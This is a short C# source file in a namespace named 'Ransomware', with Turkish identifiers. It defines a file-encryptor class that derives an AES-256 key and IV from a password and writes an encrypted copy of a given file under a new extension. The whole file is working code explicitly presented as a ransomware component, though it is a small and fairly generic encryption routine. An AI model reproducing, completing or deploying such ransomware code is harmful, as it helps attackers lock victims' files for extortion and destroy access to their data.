using System.IO;
using System.Security.Cryptography;

namespace Ransomware.SistemFonk;

internal class DosyaSifreleyici
{
	private RijndaelManaged aes256;

	private Rfc2898DeriveBytes rfc2898;

	private ICryptoTransform ict;

	private string key { get; set; }

	private byte[] iv { get; set; }

	public DosyaSifreleyici(string key, byte[] iv)
	{
		aes256 = new RijndaelManaged();
		rfc2898 = new Rfc2898DeriveBytes(key, iv);
		ict = aes256.CreateEncryptor(rfc2898.GetBytes(32), rfc2898.GetBytes(16));
	}

	public void Sifrele(string yol, string uzanti)
	{
		using FileStream stream = new FileStream(yol + uzanti, FileMode.Create);
		using FileStream fileStream = new FileStream(yol, FileMode.Open, FileAccess.Read);
		using CryptoStream cryptoStream = new CryptoStream(stream, ict, CryptoStreamMode.Write);
		int num;
		while ((num = fileStream.ReadByte()) != -1)
		{
			cryptoStream.WriteByte((byte)num);
		}
	}
}
